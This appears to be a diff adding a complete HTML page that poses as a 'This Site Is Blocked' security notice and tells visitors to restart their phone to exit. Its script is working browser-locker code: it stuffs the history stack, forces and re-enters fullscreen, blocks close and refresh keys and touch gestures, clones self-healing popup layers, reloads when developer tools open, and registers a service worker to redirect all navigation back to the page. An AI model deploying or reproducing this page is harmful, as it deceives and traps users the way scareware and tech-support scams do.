@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0,
+    maximum-scale=1.0, minimum-scale=1.0, user-scalable=no" />
+  <title>Warning</title>
+  <style>
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      touch-action: none;
+      overscroll-behavior: none;
+      background: #000;
+      font-family: -apple-system, 'Segoe UI', Arial, sans-serif;
+    }
+
+    /* ── Layer wrapper — 5 stacked copies for resilience ── */
+    .popup-layer {
+      position: fixed;
+      inset: 0;
+      width: 100vw;
+      height: 100dvh;
+      background: #0a0a0a;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 32px 24px;
+      text-align: center;
+      user-select: none;
+      -webkit-user-select: none;
+      pointer-events: all;
+    }
+
+    .icon {
+      font-size: 72px;
+      animation: pulse 1.8s ease-in-out infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { transform: scale(1);   opacity: 1;    }
+      50%       { transform: scale(1.1); opacity: 0.7; }
+    }
+
+    .title {
+      margin-top: 20px;
+      font-size: clamp(22px, 6vw, 32px);
+      font-weight: 800;
+      color: #ff3b3b;
+      letter-spacing: 0.5px;
+      text-shadow: 0 0 24px rgba(255,59,59,0.55);
+    }
+
+    .divider {
+      width: 60px;
+      height: 3px;
+      background: #ff3b3b;
+      border-radius: 2px;
+      margin: 18px auto;
+    }
+
+    .message {
+      font-size: clamp(14px, 4vw, 17px);
+      color: #cccccc;
+      line-height: 1.7;
+      max-width: 420px;
+    }
+
+    .badge {
+      position: fixed;
+      bottom: 28px;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 12px;
+      color: #333;
+      letter-spacing: 0.5px;
+      pointer-events: none;
+    }
+
+    @keyframes shake {
+      0%,100% { transform: translateX(0); }
+      20%      { transform: translateX(-10px); }
+      40%      { transform: translateX(10px); }
+      60%      { transform: translateX(-7px); }
+      80%      { transform: translateX(7px); }
+    }
+    .shake { animation: shake 0.45s ease; }
+  </style>
+</head>
+<body>
+
+  <!-- PRIMARY POPUP — edit your message here -->
+  <div class="popup-layer" id="popup-0" style="z-index:2147483647;">
+    <div class="icon">⛔</div>
+
+    <!-- ↓↓ CHANGE TITLE HERE ↓↓ -->
+    <div class="title">This Site Is Blocked</div>
+
+    <div class="divider"></div>
+
+    <!-- ↓↓ CHANGE MESSAGE HERE ↓↓ -->
+    <div class="message">
+      This website is not allowed on this device.<br><br>
+      You cannot continue from here.<br><br>
+      <strong style="color:#ff3b3b;">Restart your phone to exit.</strong>
+    </div>
+
+    <div class="badge">🔒 Secured</div>
+  </div>
+
+  <script>
+    'use strict';
+
+    /* ════════════════════════════════════════════════════════
+       MAXIMUM BROWSER-LEVEL LOCK — All techniques combined
+    ════════════════════════════════════════════════════════ */
+
+    const primaryPopup = document.getElementById('popup-0');
+
+
+    /* ── TECHNIQUE 1: HISTORY STACK STUFFING ────────────────
+       Push 100 fake entries so Back button requires 100 presses.
+       Re-fills every time Back is actually pressed.           */
+    function stuffHistory() {
+      for (let i = 0; i < 100; i++) {
+        history.pushState({ locked: true, i }, '', window.location.href);
+      }
+    }
+    stuffHistory();
+    window.addEventListener('popstate', () => {
+      stuffHistory();
+      shakeAll();
+    });
+
+
+    /* ── TECHNIQUE 2: FULLSCREEN API ────────────────────────
+       Hides address bar, tabs, and browser navigation.
+       Re-enters if the user somehow exits fullscreen.        */
+    function goFullscreen() {
+      const el = document.documentElement;
+      const fn = el.requestFullscreen
+              || el.webkitRequestFullscreen
+              || el.mozRequestFullScreen
+              || el.msRequestFullscreen;
+      if (fn) fn.call(el).catch(() => {});
+    }
+    goFullscreen();
+
+    ['fullscreenchange','webkitfullscreenchange','mozfullscreenchange'].forEach(evt => {
+      document.addEventListener(evt, () => {
+        const inFS = document.fullscreenElement
+                  || document.webkitFullscreenElement
+                  || document.mozFullScreenElement;
+        if (!inFS) setTimeout(goFullscreen, 80);
+      });
+    });
+
+
+    /* ── TECHNIQUE 3: FULLSCREEN HEARTBEAT ─────────────────
+       Checks every 2.5 seconds and re-enters fullscreen
+       in case the browser silently exited it.               */
+    setInterval(() => {
+      const inFS = document.fullscreenElement
+                || document.webkitFullscreenElement
+                || document.mozFullScreenElement;
+      if (!inFS) goFullscreen();
+    }, 2500);
+
+
+    /* ── TECHNIQUE 4: KEYBOARD SHORTCUT BLOCKER ────────────
+       Blocks Ctrl+W, Ctrl+T, Ctrl+N, Ctrl+R, Alt+F4, F5   */
+    document.addEventListener('keydown', (e) => {
+      const ctrl = e.ctrlKey || e.metaKey;
+      const blocked =
+        (ctrl && ['w','t','n','r','f4'].includes(e.key.toLowerCase())) ||
+        (e.altKey && e.key === 'F4') ||
+        ['F5','F11'].includes(e.key);
+      if (blocked) {
+        e.preventDefault();
+        e.stopImmediatePropagation();
+        shakeAll();
+      }
+    }, true);
+
+
+    /* ── TECHNIQUE 5: TOUCH GESTURE BLOCKER ─────────────────
+       Prevents swipe-back, pull-to-refresh, pinch zoom      */
+    document.addEventListener('touchstart', e => {
+      if (e.touches.length > 1) e.preventDefault();
+    }, { passive: false });
+    document.addEventListener('touchmove', e => {
+      e.preventDefault();
+    }, { passive: false });
+    document.addEventListener('touchend', e => {
+      e.preventDefault();
+    }, { passive: false });
+
+
+    /* ── TECHNIQUE 6: BEFORE-UNLOAD ─────────────────────────
+       Shows "Leave site?" when user tries to close the tab  */
+    window.addEventListener('beforeunload', e => {
+      e.preventDefault();
+      e.returnValue = '';
+      return '';
+    });
+
+
+    /* ── TECHNIQUE 7: VISIBILITY + FOCUS RE-LOCK ────────────
+       Re-enters fullscreen when tab becomes active again     */
+    document.addEventListener('visibilitychange', () => {
+      if (!document.hidden) setTimeout(goFullscreen, 150);
+    });
+    window.addEventListener('focus', () => setTimeout(goFullscreen, 150));
+    window.addEventListener('pageshow', () => setTimeout(goFullscreen, 150));
+
+
+    /* ── TECHNIQUE 8: CONTEXT MENU BLOCKER ─────────────────
+       Removes the long-press / right-click menu             */
+    document.addEventListener('contextmenu', e => e.preventDefault());
+
+
+    /* ── TECHNIQUE 9: SELECTION & DRAG BLOCKER ─────────────
+       Prevents text highlighting and element dragging       */
+    document.addEventListener('selectstart', e => e.preventDefault());
+    document.addEventListener('dragstart',   e => e.preventDefault());
+
+
+    /* ── TECHNIQUE 10: SCREEN ORIENTATION LOCK ─────────────
+       Forces portrait so rotating phone doesn't reveal chrome */
+    if (screen.orientation && screen.orientation.lock) {
+      screen.orientation.lock('portrait').catch(() => {});
+    }
+
+
+    /* ── TECHNIQUE 11: WAKE LOCK ────────────────────────────
+       Keeps the screen on so it doesn't auto-sleep/lock     */
+    async function requestWakeLock() {
+      try {
+        await navigator.wakeLock.request('screen');
+      } catch(e) {}
+    }
+    requestWakeLock();
+    document.addEventListener('visibilitychange', () => {
+      if (!document.hidden) requestWakeLock();
+    });
+
+
+    /* ── TECHNIQUE 12: STACKED POPUP LAYERS ─────────────────
+       Creates 4 more copies of the popup on top of each other.
+       Removing one via DevTools still leaves 4 more.        */
+    for (let i = 1; i <= 4; i++) {
+      const clone = primaryPopup.cloneNode(true);
+      clone.id = `popup-${i}`;
+      clone.style.zIndex = 2147483647 - i;
+      document.body.appendChild(clone);
+    }
+
+
+    /* ── TECHNIQUE 13: MUTATION OBSERVER (SELF-HEALING) ─────
+       If someone deletes the popup via browser DevTools,
+       it instantly re-adds itself.                          */
+    const popupHTML = document.body.innerHTML;
+    const observer = new MutationObserver(() => {
+      const popups = document.querySelectorAll('[id^="popup-"]');
+      if (popups.length < 5) {
+        // Re-add missing layers
+        for (let i = 0; i <= 4; i++) {
+          if (!document.getElementById(`popup-${i}`)) {
+            const div = primaryPopup.cloneNode(true);
+            div.id = `popup-${i}`;
+            div.style.zIndex = 2147483647 - i;
+            document.body.appendChild(div);
+          }
+        }
+      }
+    });
+    observer.observe(document.body, { childList: true, subtree: false });
+
+
+    /* ── TECHNIQUE 14: DEVTOOLS DETECTION ───────────────────
+       Detects if developer tools are open.
+       If so, reloads the page (clears any DOM edits).       */
+    let devtoolsOpen = false;
+    setInterval(() => {
+      const before = performance.now();
+      // eslint-disable-next-line no-debugger
+      debugger;
+      const after = performance.now();
+      if (after - before > 150 && !devtoolsOpen) {
+        devtoolsOpen = true;
+        location.reload();
+      } else if (after - before < 50) {
+        devtoolsOpen = false;
+      }
+    }, 1500);
+
+    // Also check window size ratio (DevTools docked changes viewport)
+    const originalRatio = window.outerWidth / window.innerWidth;
+    setInterval(() => {
+      const ratio = window.outerWidth / window.innerWidth;
+      if (Math.abs(ratio - originalRatio) > 0.3) {
+        location.reload();
+      }
+    }, 2000);
+
+
+    /* ── TECHNIQUE 15: SERVICE WORKER REGISTRATION ──────────
+       Registers sw.js which intercepts all navigation and
+       redirects back to this page. Survives page refresh.   */
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.register('/sw.js', { scope: '/' })
+        .catch(() => {});
+    }
+
+
+    /* ── SHAKE HELPER ────────────────────────────────────────
+       Shakes all popup layers when Back is pressed           */
+    function shakeAll() {
+      document.querySelectorAll('[id^="popup-"]').forEach(el => {
+        el.classList.remove('shake');
+        void el.offsetWidth;
+        el.classList.add('shake');
+        el.addEventListener('animationend', () => el.classList.remove('shake'), { once: true });
+      });
+    }
+
+  </script>
+</body>
+</html>
